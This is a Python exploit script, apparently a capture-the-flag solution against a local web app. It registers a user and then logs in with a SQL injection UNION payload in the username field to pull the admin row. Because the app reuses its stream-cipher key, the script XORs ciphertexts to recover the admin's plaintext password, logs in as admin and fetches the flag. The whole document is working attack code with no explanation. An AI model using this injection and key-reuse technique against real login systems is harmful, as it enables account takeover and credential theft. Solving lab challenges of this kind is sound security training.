#!/usr/bin/env python3
import base64
import os

import requests

BASE_URL = os.environ.get("BASE_URL", "http://localhost:61140")

user = "user123"
pw = "A" * 64
s = requests.Session()

print("registering", user)
r = s.post(f"{BASE_URL}/register", json={"username": user, "password": pw})

login = s.post(f"{BASE_URL}/login", json={"username": user, "password": pw})
my_cipher_b64 = login.json().get("cipher")
my_cipher = base64.b64decode(my_cipher_b64)

payload_user = (
    "x' UNION SELECT username, password, "
    f"'{my_cipher_b64}', tag, is_admin FROM users WHERE is_admin=1 LIMIT 1 --"
)
bad_pw = pw
print("spraying the union payload")
admin_resp = s.post(f"{BASE_URL}/login", json={"username": payload_user, "password": bad_pw})
admin_data = admin_resp.json()
admin_cipher = base64.b64decode(admin_data["nonce_b64"])
admin_user = admin_data["username"]

keystream = bytes(a ^ b for a, b in zip(my_cipher, pw.encode()))
admin_pw = bytes(a ^ b for a, b in zip(admin_cipher, keystream)).decode(errors="ignore")
print("admin pw:", admin_pw)

flag_login = s.post(f"{BASE_URL}/login", json={"username": admin_user, "password": admin_pw})

flag = s.post(f"{BASE_URL}/admin/flag")
print("flag?", flag.text)
